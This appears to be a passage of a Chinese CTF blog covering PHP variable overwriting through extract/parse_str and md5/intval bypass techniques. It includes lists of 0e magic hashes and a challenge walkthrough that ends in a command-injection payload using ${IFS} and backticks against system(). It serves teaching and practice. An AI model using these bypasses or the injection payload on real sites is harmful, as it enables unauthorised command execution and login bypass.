<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;template.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$template</span> = <span class="keyword">array</span>(<span class="string">&#x27;tp1&#x27;</span>=&gt;<span class="string">&#x27;tp1.tpl&#x27;</span>,<span class="string">&#x27;tp2&#x27;</span>=&gt;<span class="string">&#x27;tp2.tpl&#x27;</span>,<span class="string">&#x27;tp3&#x27;</span>=&gt;<span class="string">&#x27;tp3.tpl&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>], EXTR_OVERWRITE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$tp</span>, <span class="variable">$template</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No! You only have 3 template to reader&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$template</span>[<span class="variable">$tp</span>]);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Template</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please choice one template to reader&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>主要就是通过变量覆盖达到访问   template.php  的目的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$template</span> = <span class="keyword">array</span>(<span class="string">&#x27;tp1&#x27;</span>=&gt;<span class="string">&#x27;tp1.tpl&#x27;</span>,<span class="string">&#x27;tp2&#x27;</span>=&gt;<span class="string">&#x27;tp2.tpl&#x27;</span>,<span class="string">&#x27;tp3&#x27;</span>=&gt;<span class="string">&#x27;tp3.tpl&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>], EXTR_OVERWRITE);</span><br></pre></td></tr></table></figure>

<p>通过传入的var 参数实现覆盖  template  中的东西   传入的var需要是一个数组</p>
<p>?var[template]  [tp1] &#x3D; template.php       就把原来array数组里的   tp1换成了  template.php</p>
<p>总的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var[template][tp1]=template.php&amp;tp=tp1</span><br></pre></td></tr></table></figure>



<h2 id="Parse-str函数"><a href="#Parse-str函数" class="headerlink" title="Parse_str函数"></a>Parse_str函数</h2><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662032044866.png" alt="1662032044866"></p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>源码</p>
<p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662032119802.png" alt="1662032119802"></p>
<p>发现  md5(‘QNKCDZO’)   的值为0e开头的一串   所以只需要传入  id&#x3D;a[]&#x3D;0e开头经过md5加密后然后   还是0e开头的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a[]=240610708</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag">变量覆盖</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-md5绕过"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/md5%E7%BB%95%E8%BF%87/"
    >md5绕过</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/md5%E7%BB%95%E8%BF%87/" class="article-date">
  <time datetime="2023-02-02T07:11:24.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/md5%E7%BB%95%E8%BF%87/">md5绕过</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="1-登录的md5绕过"><a href="#1-登录的md5绕过" class="headerlink" title="1.登录的md5绕过"></a>1.登录的md5绕过</h1><h2 id="1-1-两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过"><a href="#1-1-两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过" class="headerlink" title="1.1  两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过"></a>1.1  两个变量不同，但是两个变量的md5值弱相同，利用0e开头的绕过</h2><p>$a !&#x3D; $b </p>
<p>Md5($a) &#x3D;&#x3D; md5($b)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-2-两个变量不同，两个变量的md5值强相同，利用数组绕过"><a href="#1-2-两个变量不同，两个变量的md5值强相同，利用数组绕过" class="headerlink" title="1.2 两个变量不同，两个变量的md5值强相同，利用数组绕过"></a>1.2 两个变量不同，两个变量的md5值强相同，利用数组绕过</h2><p>$a !&#x3D; $b </p>
<p>Md5($a) &#x3D;&#x3D;&#x3D; md5($b) </p>
<p>由于md5不能处理数组类型，所以返回值为null,利用null &#x3D;&#x3D;&#x3D; null,实现绕过</p>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>b[]<span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>



<h2 id="1-3-两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过"><a href="#1-3-两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过" class="headerlink" title="1.3  两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过"></a>1.3  两个变量转化为字符串不相同，两个变量的md5值相同，利用MD5碰撞绕过</h2><p>(string)$a !&#x3D; (string)$b </p>
<p>Md5($a) &#x3D;&#x3D;&#x3D; md5($b)</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
<h1 id="2-绕过intval"><a href="#2-绕过intval" class="headerlink" title="2.绕过intval()"></a>2.绕过intval()</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">需要绕过 intval()，由于 intval() 可以处理的不仅仅是十进制，还有八进制、十六进制、 </span><br><span class="line"></span><br><span class="line">科学计数法等。写个测试脚本 </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">​	$a=_GET[&#x27;a&#x27;]; </span><br><span class="line"></span><br><span class="line">​	echo intval($a);</span><br><span class="line"></span><br><span class="line">​	echo intval($a+1) ;</span><br><span class="line"></span><br><span class="line">传入 1e5，输出：1 100001，绕过成功</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">首先 $a 是字符串所以 intval() 返回了字母前的数字，也就是 e 前面的 1 </span><br><span class="line"></span><br><span class="line">echo intval(1e10); // 1410065408</span><br><span class="line"></span><br><span class="line">echo intval(&#x27;1e10&#x27;); *// 1* </span><br><span class="line"></span><br><span class="line">然后 $a+1 进行了字符串与数字相加的运算，在 php 中，这种结果取决于这个字符串长什么样，就 $a+1 来讲： </span><br><span class="line"></span><br><span class="line">$a 数字开头、中间有其他字母，比如 123y1ng，将 $a 从字符串转数字，转换结果为开头的数字，实际运算 123+1 </span><br><span class="line"></span><br><span class="line">$a 字母开头，比如 y1ng，转数字结果为 0，实际运算为 0+1 </span><br><span class="line"></span><br><span class="line">$a 是 1e5 这种科学计数法形式，先转成 1×10^5 也就是 10000，再 10000+1 </span><br><span class="line"></span><br><span class="line">所以输入了 1e5，在进行加一之后，就从 1 变成了 100001，绕过成功</span><br></pre></td></tr></table></figure>



<h1 id="3-经过md5加密后的值弱等于原来变量"><a href="#3-经过md5加密后的值弱等于原来变量" class="headerlink" title="3.经过md5加密后的值弱等于原来变量"></a>3.经过md5加密后的值弱等于原来变量</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)</span><br><span class="line"><span class="number">0e215962017</span> <span class="number">0e291242476940776845150308577824</span></span><br><span class="line"><span class="number">0e00275209979</span> <span class="number">0e551387587965716321018342879905</span></span><br><span class="line"><span class="number">0e00506035745</span> <span class="number">0e224441551631909369101555335043</span></span><br><span class="line"><span class="number">0e00540451811</span> <span class="number">0e057099852684304412663796608095</span></span><br><span class="line"><span class="number">0e00678205148</span> <span class="number">0e934049274119262631743072394111</span></span><br><span class="line"><span class="number">0e00741250258</span> <span class="number">0e899567782965109269932883593603</span></span><br><span class="line"><span class="number">0e00928251504</span> <span class="number">0e148856674729228041723861799600</span></span><br><span class="line"><span class="number">0e01350016114</span> <span class="number">0e769018222125751782256460324867</span></span><br><span class="line"><span class="number">0e01352028862</span> <span class="number">0e388419153010508575572061606161</span></span><br><span class="line"><span class="number">0e01392313004</span> <span class="number">0e793314107039222217518920037885</span></span><br><span class="line"><span class="number">0e01875552079</span> <span class="number">0e780449305367629893512581736357</span></span><br><span class="line"><span class="number">0e01975903983</span> <span class="number">0e317084484960342086618161584202</span></span><br><span class="line"><span class="number">0e02042356163</span> <span class="number">0e335912055437180460060141819624</span></span><br><span class="line"><span class="number">0e02218562930</span> <span class="number">0e151492820470888772364059321579</span></span><br><span class="line"><span class="number">0e02451355147</span> <span class="number">0e866503534356013079241759641492</span></span><br><span class="line"><span class="number">0e02739970294</span> <span class="number">0e894318228115677783240047043017</span></span><br><span class="line"><span class="number">0e02760920150</span> <span class="number">0e413159393756646578537635311046</span></span><br><span class="line"><span class="number">0e02784726287</span> <span class="number">0e433955189140949269100965859496</span></span><br><span class="line"><span class="number">0e03298616350</span> <span class="number">0e851613188370453906408258609284</span></span><br><span class="line"><span class="number">0e03393034171</span> <span class="number">0e077847024281996293485700020358</span></span><br></pre></td></tr></table></figure>

<h1 id="4-经过两次md5加密后的值等于原变量"><a href="#4-经过两次md5加密后的值等于原变量" class="headerlink" title="4.经过两次md5加密后的值等于原变量"></a>4.经过两次md5加密后的值等于原变量</h1><p>0e1138100474</p>
<h1 id="5-一串字符经过md5加密后是0e开头"><a href="#5-一串字符经过md5加密后是0e开头" class="headerlink" title="5.  一串字符经过md5加密后是0e开头"></a>5.  一串字符经过md5加密后是0e开头</h1><p> <img src="/2023/02/02/md5%E7%BB%95%E8%BF%87/1662043692237.png" alt="1662043692237"></p>
<h2 id="题目1："><a href="#题目1：" class="headerlink" title="题目1："></a>题目1：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 去非洲吧</span><br></pre></td></tr></table></figure>

<p>一共分为三层绕过</p>
<p>第一层：通过绕过intval()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=212e10</span><br></pre></td></tr></table></figure>

<p>实现第一层绕过</p>
<p>第二层：$md5&#x3D;&#x3D;md5($md5）  这是一个变量的值经过md5加密后的值弱相等于原来的变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=212e10&amp;md5=0e215962017</span><br></pre></td></tr></table></figure>

<p>实现第二层绕过</p>
<p>第三层：从最后一行的system可以判断出这应该是远程命令执行的问题</p>
<p>str_irreplace()函数对打小写不敏感    把$get_flag 中的cat替换为wctf2020  其实就是把cat过滤掉了</p>
<p>str_replace()函数对大小写敏感  其他用法同上</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=212e10&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;`ls`</span><br><span class="line">或者</span><br><span class="line">?num=212e10&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>

<p>实现绕过  最后得到flag</p>
<h2 id="题目2："><a href="#题目2：" class="headerlink" title="题目2："></a>题目2：</h2><p>题目源代码</p>
